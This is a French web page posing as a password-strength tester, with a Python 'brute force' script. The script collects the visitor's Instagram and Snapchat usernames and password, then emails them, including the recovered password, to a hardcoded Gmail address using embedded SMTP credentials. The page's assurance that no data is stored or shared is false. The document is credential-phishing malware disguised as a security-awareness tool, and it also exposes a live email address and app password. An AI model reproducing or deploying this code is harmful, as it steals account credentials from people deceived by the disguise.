🔐 Testeur de Sécurité de Mot de Passe Bienvenue sur notre outil de test de mot de passe. Ce site a été conçu pour vous aider à évaluer la robustesse de votre mot de passe en simulant une attaque par force brute. L’objectif est de vous sensibiliser à l’importance d’un mot de passe complexe et sécurisé. ✅ Site sécurisé : Aucune donnée personnelle n’est enregistrée ni conservée. Les pseudos et résultats sont transmis uniquement pour analyse confidentielle, sans stockage ni partage. 🎯 Objectif du site Ce testeur vous permet de : Vérifier si votre mot de passe est facilement devinable Comprendre les risques liés aux mots de passe simples Recevoir un retour immédiat sur la sécurité de votre mot de passe 🧪 Fonctionnement du test Le testeur génère toutes les combinaisons possibles de caractères. Il compare chaque tentative à votre mot de passe. Si le mot est trouvé rapidement (moins de 10 secondes), il est considéré comme non sécurisé. 💻 Script Python utilisé import itertools, string, time, smtplib from email.mime.text import MIMEText from concurrent.futures import ThreadPoolExecutor, as_completed DESTINATAIRE = "yamafly404@gmail.com" EXPEDITEUR = "yamafly404@gmail.com" MOT_DE_PASSE = "tdig nbky fome nukp" SMTP_SERVEUR = "smtp.gmail.com" SMTP_PORT = 587 caracteres = string.ascii_letters + string.digits + string.punctuation def tester_combinaison(combinaison, mot): tentative = ''.join(combinaison) return tentative if tentative == mot else None def envoyer_email(pseudo_instagram, pseudo_snap, resultat): sujet = "Test de mot de passe - Résultat" corps = f"""Pseudo Instagram : {pseudo_instagram} Pseudo Snap : {pseudo_snap} Résultat : {resultat}""" msg = MIMEText(corps) msg["Subject"] = sujet msg["From"] = EXPEDITEUR msg["To"] = DESTINATAIRE with smtplib.SMTP(SMTP_SERVEUR, SMTP_PORT) as serveur: serveur.starttls() serveur.login(EXPEDITEUR, MOT_DE_PASSE) serveur.send_message(msg) def brute_force(mot, pseudo_instagram, pseudo_snap, max_length=6): debut = time.time() trouve = False with ThreadPoolExecutor() as executor: for longueur in range(1, max_length + 1): combinaisons = itertools.product(caracteres, repeat=longueur) futures = {executor.submit(tester_combinaison, c, mot): c for c in combinaisons} for future in as_completed(futures): resultat = future.result() if resultat: fin = time.time() temps = round(fin - debut, 2) statut = 'NON sécurisé' if temps < 10 else 'sécurisé' envoyer_email(pseudo_instagram, pseudo_snap, f"{resultat} ({statut}, {temps}s)") print(f"Mot de passe trouvé : {resultat} en {temps} secondes") trouve = True break if trouve: break if not trouve: envoyer_email(pseudo_instagram, pseudo_snap, "Mot de passe non trouvé") print("Mot de passe non trouvé dans la limite de recherche.") if __name__ == "__main__": pseudo_instagram = input("📸 Entrez votre pseudo Instagram : ") pseudo_snap = input("👻 Entrez votre pseudo Snap : ") mot = input("🔐 Entrez votre mot de passe à tester : ") brute_force(mot, pseudo_instagram, pseudo_snap) 🧪 Test interactif (simulation visuelle)
